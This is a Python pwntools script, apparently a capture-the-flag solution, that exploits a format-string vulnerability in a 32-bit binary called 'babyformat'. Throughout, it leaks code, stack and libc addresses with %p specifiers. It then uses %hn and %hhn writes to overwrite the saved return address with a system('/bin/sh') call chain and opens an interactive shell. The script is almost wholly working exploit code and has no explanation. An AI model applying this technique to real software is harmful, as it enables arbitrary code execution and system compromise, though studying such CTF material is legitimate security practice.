from pwn import *

p = process("./babyformat")
context.log_level = "debug"
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
# 3 # for codebase # main + 72
# 6 # for ebp # ebp-0xc -> i , count # cmp
# 9 # for stack # pointer to 57
def write_param(param, value):
  p.send("%%%du%%%d$hn" % (value, param))
  p.recv(value)
def write_param2(param, value):
  p.send("%%%du%%%d$hhn\n" % (value, param))
  p.recv(value)
def leak(param):
	p.send("%{}$p".format(param))
	p.recvuntil("0x")
	return eval("0x" + p.recv(8))
p.recvuntil("==== Baby Format - Echo system ====\n")
payload1 = "%3$p%6$p%9$p"
p.send(payload1)
codebase = eval(p.recv(10)) & (~0xfff)
addr_i = eval(p.recv(10)) - 0xc + 3
addr_p = eval(p.recv(10))
# to = u32(p.recv(4))
log.info("codebase : " + hex(codebase))
log.info(hex(addr_i))
log.info(hex(addr_p))

write_param(9 , addr_i & 0xffff)

write_param2(57 , 0xff)
# leak libc
p.recvline()
libc.address = leak(15) - 247 - libc.sym["__libc_start_main"]
log.info("libcbase : " + hex(libc.address))
system = libc.sym["system"]
str_bin_sh = libc.search("/bin/sh").next()
log.success(hex(libc.sym["system"]))
# leak ret
retOnStack = leak(13) - 4

payload = p32(system) + p32(0xdeadbeef) + p32(str_bin_sh)
for i in range(len(payload)):
	p.sendline("%{}c%9$hhn".format((retOnStack + i) & 0xff))
	p.recvline()
	p.sendline("%{}c%57$hhn".format(ord(payload[i])))
	p.recvline()
p.sendline("EXIT")
# sleep(1)
p.interactive()